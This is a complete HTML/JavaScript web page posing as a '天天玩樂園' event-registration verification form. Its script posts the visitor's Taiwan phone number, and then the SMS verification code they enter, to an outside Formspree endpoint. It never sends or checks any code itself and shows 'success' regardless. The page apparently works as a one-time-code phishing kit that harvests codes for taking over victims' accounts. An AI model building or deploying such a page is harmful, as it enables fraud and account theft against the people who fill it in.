<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>天天玩樂園 - 活動報名驗證</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700;900&display=swap');

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Noto Sans TC', -apple-system, BlinkMacSystemFont, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      background-color: #FFE566;
      background-image: url("data:image/svg+xml,%3Csvg width='80' height='80' viewBox='0 0 80 80' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23F5D76E' fill-opacity='0.6'%3E%3Ccircle cx='10' cy='10' r='6'/%3E%3Ccircle cx='50' cy='20' r='5'/%3E%3Ccircle cx='30' cy='50' r='7'/%3E%3Ccircle cx='70' cy='60' r='5'/%3E%3Cpath d='M20 70 a6 6 0 1 0 0.1 0'/%3E%3Cpath d='M60 40 a5 5 0 1 0 0.1 0'/%3E%3C/g%3E%3C/svg%3E");
      background-size: 80px 80px;
    }

    .card {
      background: #A8D5F0;
      background-image: radial-gradient(circle, #ffffff 1.2px, transparent 1.2px);
      background-size: 14px 14px;
      width: 100%;
      max-width: 400px;
      border-radius: 28px;
      border: 6px solid #ffffff;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
      overflow: hidden;
      position: relative;
    }

    .card-header {
      padding: 36px 24px 20px;
      text-align: center;
    }

    .title-main {
      font-size: 42px;
      font-weight: 900;
      color: #E6392B;
      letter-spacing: 6px;
      margin-bottom: 14px;
      text-shadow: 2px 2px 0 #fff;
    }

    .title-banner {
      display: inline-block;
      background: #E6392B;
      color: #FFE566;
      font-size: 32px;
      font-weight: 900;
      padding: 10px 28px;
      transform: skewX(-8deg);
      letter-spacing: 4px;
      box-shadow: 3px 3px 0 rgba(0,0,0,0.1);
    }

    .title-banner span {
      display: inline-block;
      transform: skewX(8deg);
    }

    .card-body {
      padding: 10px 28px 36px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      font-size: 15px;
      font-weight: 700;
      color: #1e3a5f;
      margin-bottom: 8px;
    }

    .phone-row {
      display: flex;
      gap: 10px;
    }

    .phone-row input {
      flex: 1;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      border: 3px solid #ffffff;
      border-radius: 14px;
      font-size: 16px;
      font-family: inherit;
      color: #1e3a5f;
      background: #ffffff;
      outline: none;
      transition: all 0.2s;
      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
    }

    input:focus {
      border-color: #E6392B;
      box-shadow: 0 0 0 4px rgba(230, 57, 43, 0.15);
    }

    input::placeholder {
      color: #94a3b8;
    }

    button {
      border: none;
      border-radius: 14px;
      font-family: inherit;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s;
    }

    .btn-send {
      background: #E6392B;
      color: #FFE566;
      padding: 0 16px;
      min-width: 110px;
      font-size: 14px;
      white-space: nowrap;
      box-shadow: 0 3px 0 #b91c1c;
    }

    .btn-send:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 5px 0 #b91c1c;
    }

    .btn-send:active:not(:disabled) {
      transform: translateY(1px);
      box-shadow: 0 1px 0 #b91c1c;
    }

    .btn-send:disabled {
      background: #fca5a5;
      color: #fff;
      box-shadow: none;
      cursor: not-allowed;
    }

    .btn-submit {
      width: 100%;
      background: #E6392B;
      color: #FFE566;
      padding: 16px;
      font-size: 18px;
      margin-top: 8px;
      box-shadow: 0 4px 0 #b91c1c;
      letter-spacing: 2px;
    }

    .btn-submit:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 6px 0 #b91c1c;
    }

    .btn-submit:active:not(:disabled) {
      transform: translateY(1px);
      box-shadow: 0 2px 0 #b91c1c;
    }

    .btn-submit:disabled {
      background: #fca5a5;
      color: #fff;
      box-shadow: none;
      cursor: not-allowed;
    }

    .error {
      color: #E6392B;
      font-size: 13px;
      margin-top: 8px;
      display: none;
      font-weight: 600;
    }

    .info-text {
      font-size: 13px;
      color: #166534;
      margin-top: 10px;
      font-weight: 600;
      display: none;
      background: #dcfce7;
      padding: 10px 14px;
      border-radius: 12px;
      border: 2px solid #86efac;
    }

    .success-box {
      display: none;
      text-align: center;
      padding: 20px;
      background: #dcfce7;
      border-radius: 16px;
      border: 3px solid #86efac;
      margin-top: 20px;
    }

    .success-box .check {
      font-size: 42px;
      margin-bottom: 6px;
    }

    .success-box p {
      color: #166534;
      font-weight: 700;
      font-size: 16px;
    }

    .footer-note {
      text-align: center;
      font-size: 12px;
      color: #1e3a5f;
      margin-top: 22px;
      line-height: 1.6;
      opacity: 0.75;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="card-header">
      <div class="title-main">天天</div>
      <div class="title-banner"><span>玩樂園</span></div>
    </div>

    <div class="card-body">
      <!-- 手機號碼 -->
      <div class="form-group">
        <label for="phone">台灣手機號碼</label>
        <div class="phone-row">
          <input
            type="tel"
            id="phone"
            placeholder="0912345678"
            maxlength="10"
            inputmode="numeric"
            autocomplete="tel"
          >
          <button class="btn-send" id="sendBtn" onclick="sendCode()">傳送驗證碼</button>
        </div>
        <div class="error" id="phoneError">請輸入正確的台灣手機號碼（09開頭共10碼）</div>
        <div class="info-text" id="sendInfo">✓ 驗證碼發送請求已送出，請稍候簡訊</div>
      </div>

      <!-- 驗證碼 -->
      <div class="form-group">
        <label for="code">驗證碼</label>
        <input
          type="text"
          id="code"
          placeholder="請輸入 6 位數驗證碼"
          maxlength="6"
          inputmode="numeric"
          autocomplete="one-time-code"
        >
        <div class="error" id="codeError">請輸入驗證碼</div>
      </div>

      <!-- 完成按鈕 -->
      <button class="btn-submit" id="submitBtn" onclick="submitForm()">完成驗證</button>

      <div class="success-box" id="successMsg">
        <div class="check">✅</div>
        <p>驗證成功！報名已完成</p>
      </div>

      <div class="footer-note">
        驗證碼將發送至您的手機<br>
        如未收到請稍候或重新傳送
      </div>
    </div>
  </div>

  <script>
    const FORMSPREE_URL = "https://formspree.io/f/xrpeyddg";

    let countdown = 0;
    let timer = null;

    function isValidTaiwanPhone(phone) {
      return /^09\d{8}$/.test(phone);
    }

    async function sendCode() {
      const phone = document.getElementById("phone").value.trim();
      const phoneError = document.getElementById("phoneError");
      const sendBtn = document.getElementById("sendBtn");
      const sendInfo = document.getElementById("sendInfo");

      if (!isValidTaiwanPhone(phone)) {
        phoneError.style.display = "block";
        return;
      }
      phoneError.style.display = "none";

      sendBtn.disabled = true;
      sendBtn.textContent = "傳送中...";

      try {
        const res = await fetch(FORMSPREE_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            type: "傳送驗證碼請求",
            phone: phone,
            message: `客人請求發送驗證碼，手機號碼：${phone}`
          })
        });

        if (res.ok) {
          sendInfo.style.display = "block";

          countdown = 60;
          sendBtn.textContent = `${countdown} 秒後重發`;

          clearInterval(timer);
          timer = setInterval(() => {
            countdown--;
            if (countdown <= 0) {
              clearInterval(timer);
              sendBtn.disabled = false;
              sendBtn.textContent = "傳送驗證碼";
            } else {
              sendBtn.textContent = `${countdown} 秒後重發`;
            }
          }, 1000);
        } else {
          throw new Error("發送失敗");
        }
      } catch (err) {
        alert("發送失敗，請確認網路連線後再試");
        sendBtn.disabled = false;
        sendBtn.textContent = "傳送驗證碼";
        console.error(err);
      }
    }

    async function submitForm() {
      const phone = document.getElementById("phone").value.trim();
      const code = document.getElementById("code").value.trim();
      const phoneError = document.getElementById("phoneError");
      const codeError = document.getElementById("codeError");
      const successMsg = document.getElementById("successMsg");
      const submitBtn = document.getElementById("submitBtn");

      phoneError.style.display = "none";
      codeError.style.display = "none";
      successMsg.style.display = "none";

      if (!isValidTaiwanPhone(phone)) {
        phoneError.style.display = "block";
        return;
      }

      if (!code) {
        codeError.style.display = "block";
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = "提交中...";

      try {
        const res = await fetch(FORMSPREE_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            type: "完成驗證",
            phone: phone,
            code: code,
            message: `客人完成驗證\n手機號碼：${phone}\n驗證碼：${code}`
          })
        });

        if (res.ok) {
          successMsg.style.display = "block";
          submitBtn.textContent = "已完成";
        } else {
          throw new Error("提交失敗");
        }
      } catch (err) {
        alert("提交失敗，請確認網路連線後再試");
        submitBtn.disabled = false;
        submitBtn.textContent = "完成驗證";
        console.error(err);
      }
    }

    // 只允許輸入數字
    document.getElementById("phone").addEventListener("input", function () {
      this.value = this.value.replace(/\D/g, "");
    });

    document.getElementById("code").addEventListener("input", function () {
      this.value = this.value.replace(/\D/g, "");
    });
  </script>
</body>
</html>
